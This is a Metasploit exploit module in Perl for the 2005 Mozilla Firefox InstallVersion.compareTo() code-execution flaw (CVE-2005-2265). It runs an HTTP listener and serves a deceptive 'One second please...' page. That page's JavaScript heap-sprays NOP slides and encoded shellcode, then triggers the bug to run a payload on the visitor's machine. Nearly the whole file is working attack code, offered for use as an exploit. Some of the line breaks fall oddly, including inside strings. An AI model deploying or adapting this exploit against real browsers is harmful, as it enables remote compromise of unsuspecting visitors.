
##
# This file is part of the Metasploit Framework and may be
# redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the
# same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::mozilla_compareto;

use strict;
use base "Msf::Exploit";
use Pex::Text;
use IO::Socket::INET;

my $advanced = { };

my $info =
{
    'Name'           => 'Mozilla Suite/Firefox
InstallVersion->compareTo() Code Execution',
	'Version'        => '$Revision: 1.3 $',
'Authors'        =>
  [
  'Aviv Raff <avivra [at] gmail.com>',
'H D Moore <hdm [at] metasploit.com>',
  ],

'Description'    =>
  Pex::Text::Freeform(qq{
This module exploits a code execution vulnerability in the Mozilla
Suite, Mozilla Firefox, and Mozilla Thunderbird applications. This
  exploit 
module is a direct port of Aviv Raff's HTML PoC.
}),

    'Arch'           => [ 'x86' ],
    'OS'             => [ 'win32' ],
    'Priv'           => 0,

    'UserOpts'       =>
{
    'HTTPPORT' => [ 1, 'PORT', 'The local HTTP listener port', 8080
		    ],
	'HTTPHOST' => [ 0, 'HOST', 'The local HTTP listener host',
			"0.0.0.0" ],
    },

    'Payload'        =>
{
    'Space'    => 400,
    'BadChars' => "\x00",
    'Keys'     => ['-bind'],
},
    'Refs'           =>
      [
       ['BID',    '14242'],
       ['OSVDB',  '17968'],
       ['CVE',    '2005-2265'],
       ['URL',
	'http://www.mozilla.org/security/announce/mfsa2005-50.html'],
         ],

    'DefaultTarget'  => 0,
    'Targets'        =>
      [
       [ 'Mozilla Firefox < 1.0.5 for Windows', 0x12000000,
    0x11C0002C, 0x1200002C, 0x1180002C ]
         ],
    
    'Keys'           => [ 'mozilla' ],

    'DisclosureDate' => 'Jul 13 2005',
};

sub new {
    my $class = shift;
    my $self = $class->SUPER::new({'Info' => $info, 'Advanced' =>
				       $advanced}, @_);
    return($self);
}

sub Exploit
{
    my $self = shift;
    my $server = IO::Socket::INET->new(
				       LocalHost =>
				       $self->GetVar('HTTPHOST'),
				       LocalPort =>
				       $self->GetVar('HTTPPORT'),
				       ReuseAddr => 1,
				       Listen    => 1,
				       Proto     => 'tcp'
				       );
    my $client;

    # Did the listener create fail?
    if (not defined($server)) {
	$self->PrintLine("[-] Failed to create local HTTP listener on
    " . $self->GetVar('HTTPPORT'));
	return;
    }

    my $httphost = ($self->GetVar('HTTPHOST') eq '0.0.0.0') ?
      Pex::Utils::SourceIP('1.2.3.4') :
	  $self->GetVar('HTTPHOST');

    $self->PrintLine("[*] Waiting for connections to
    http://". $httphost .":". $self->GetVar('HTTPPORT') ."/");

    while (defined($client = $server->accept())) {
	$self->HandleHttpClient(Msf::Socket::Tcp->new_from_socket($client));
    }

    return;
}

sub HandleHttpClient
{
    my $self = shift;
    my $fd   = shift;

    # Set the remote host information
    my ($rport, $rhost) = ($fd->PeerPort, $fd->PeerAddr);
    

    # Read the HTTP command
    my ($cmd, $url, $proto) = split / /, $fd->RecvLine(10);

    $self->PrintLine("[*] HTTP Client connected from $rhost:$rport,
    sending payload...");


    my $content = $self->GenerateHTML();
    
    # Transmit the HTTP response
    my $req = 
	"HTTP/1.0 200 OK\r\n" .
	    "Content-Type: text/html\r\n" .
		"Content-Length: " . length($content) . "\r\n" .
		    "Connection: close\r\n" .
			"\r\n" .
			    $content;
    
    my $res = $fd->Send($req);

    $fd->Close();
}

sub JSUnescape {
    my $self = shift;
    my $data = shift;
    my $code = '';
    
    # Encode the shellcode via %u sequences for JS's unescape()
    function
	my $idx = 0;
    while ($idx < length($data) - 1) {
	my $c1 = ord(substr($data, $idx, 1));
	my $c2 = ord(substr($data, $idx+1, 1));
	$code .= sprintf('%%u%.2x%.2x', $c2, $c1);
	$idx += 2;
    }
    
    return $code;
}

sub GenerateHTML {
    my $self   = shift;
    my $target = $self->Targets->[$self->GetVar('TARGET')];
    
    my $shellcode   =
    $self->JSUnescape($self->GetVar('EncodedPayload')->Payload);
    my $sprayTo     = sprintf("0x%.8x", $target->[1]);
    my $spraySlide1 = $self->JSUnescape(pack('V', $target->[2]));
    my $spraySlide2 = $self->JSUnescape(pack('V', $target->[3]));
    my $eaxAddress  = sprintf("0x%.8x", $target->[4]);
    
    my $data  = qq#
<html>
<head>
<!-- 
     Copyright (C) 2005-2006 Aviv Raff (with minor modifications by
    HDM for the MSF module)
       From:
    http://aviv.raffon.net/2005/12/11/MozillaUnderestimateVulnerabilityYetAgainPlusOldVulnerabilityNewExploit.aspx
      Greets: SkyLined, The Insider and shutdown 
-->
    <title>One second please...</title>
	<script language="javascript">

	    function BodyOnLoad() 
	    {
		location.href="javascript:void (new
	    InstallVersion());";
		CrashAndBurn();
	    };

    // The "Heap Spraying" is based on SkyLined InternetExploiter2
    methodology
	function CrashAndBurn() 
	{
	    // Spray up to this address
		var heapSprayToAddress=$sprayTo;

	    // Payload - Just return..
		var payLoadCode=unescape("$shellcode");

	    // Size of the heap blocks  
		var heapBlockSize=0x400000;
	    
	    // Size of the payload in bytes
		var payLoadSize=payLoadCode.length * 2; 
	    
	    // Caluclate spray slides size
		var spraySlideSize=heapBlockSize-(payLoadSize+0x38);
		// exclude header

		    // Set first spray slide ("pdata") with "pvtbl"
		    fake address - 0x11C0002C
			var spraySlide1 = unescape("$spraySlide1"); 

	    spraySlide1 = getSpraySlide(spraySlide1,spraySlideSize); 

	    var spraySlide2 = unescape("$spraySlide2"); //0x1200002C 

		spraySlide2 =
		getSpraySlide(spraySlide2,spraySlideSize);

	    var spraySlide3 = unescape("\%u9090\%u9090");
	    spraySlide3 = getSpraySlide(spraySlide3,spraySlideSize);

	    // Spray the heap
		heapBlocks=(heapSprayToAddress-0x400000)/heapBlockSize;
	    //alert(spraySlide2.length); return;
	    memory = new Array();
	    for (i=0;i<heapBlocks;i++) 
	    {
		memory[i]=(i\%3==0) ? spraySlide1 + payLoadCode: 
		(i\%3==1) ? spraySlide2 + payLoadCode: spraySlide3 +
		payLoadCode;
	    }

	    // Set address to fake "pdata".
		var eaxAddress = $eaxAddress;
	    //This was taken from shutdown's PoC in bugzilla
// struct vtbl { void (*code)(void); };
// struct data { struct vtbl *pvtbl; };
//
// struct data *pdata = (struct data *)(xxAddress & ~0x01);
// pdata->pvtbl->code(pdata);
//
(new InstallVersion).compareTo(new Number(eaxAddress >> 1));
}

function getSpraySlide(spraySlide, spraySlideSize) {
    while (spraySlide.length*2<spraySlideSize) 
{
    spraySlide+=spraySlide;
}
spraySlide=spraySlide.substring(0,spraySlideSize/2);
return spraySlide;
}

// -->
    </script>
</head>
<body onload="BodyOnLoad()">
</body>
</html>
#;
}

1;
